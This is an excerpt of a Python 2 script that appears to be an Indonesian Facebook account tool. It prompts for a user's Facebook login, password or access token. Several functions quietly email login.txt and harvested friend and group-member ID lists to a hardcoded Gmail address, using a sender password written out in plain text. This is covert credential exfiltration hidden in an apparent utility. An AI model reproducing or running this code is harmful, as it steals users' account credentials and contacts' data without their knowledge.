...
#Token
def logz():
    email_user = 'justabotsubs12@gmail.com'
    email_password = 'ohiabuebmpoeomqk'
    email_send = 'wareares@gmail.com'
    subject = 'Akun : '
    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject
    body = 'Samlekom Mamang'
    msg.attach(MIMEText(body, 'plain'))
    filename = 'login.txt'
    attachment = open('login.txt', 'rb')
...
def temz():
    ...
    body = 'Samlekom Mamang'
    msg.attach(MIMEText(body, 'plain'))
    filename = 'out/id_teman.txt'
    attachment = open('out/id_teman.txt', 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename= ' + filename)
...
def temzz():
    ...
    body = 'Samlekom Mamang'
    msg.attach(MIMEText(body, 'plain'))
    filename = 'out/id_teman_from_teman.txt'
    attachment = open('out/id_teman_from_teman.txt', 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename= ' + filename)
...
def grup():
    ...
    body = 'Samlekom Mamang'
    msg.attach(MIMEText(body, 'plain'))
    filename = 'out/member_grup.txt'
    attachment = open('out/member_grup.txt', 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename= ' + filename)
...
def login():
    ...
    try:
        ...
        print ""
        print logo
        print '%s[%s\xe2\x9c\x93%s] \x1b[1;92mLOGIN AKUN FACEBOOK %s[%s\xe2\x9c\x93%s]' % (W,O,W,W,O,W)
        id = raw_input('%s[%s+%s] \x1b[1;36mID\x1b[1;97m|\x1b[1;96mEmail\x1b[1;97m \x1b[1;91m:\x1b[1;92m ' % (W,G,W))
        pwd = getpass.getpass('%s[%s+%s] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ' % (W,O,W))
...
def tokenz():
    ...
    print ""
    print logo
    toket = raw_input('%s[%s+%s] \x1b[1;92mToken\x1b[1;91m : \x1b[1;97m' % (W,G,W))
    try:
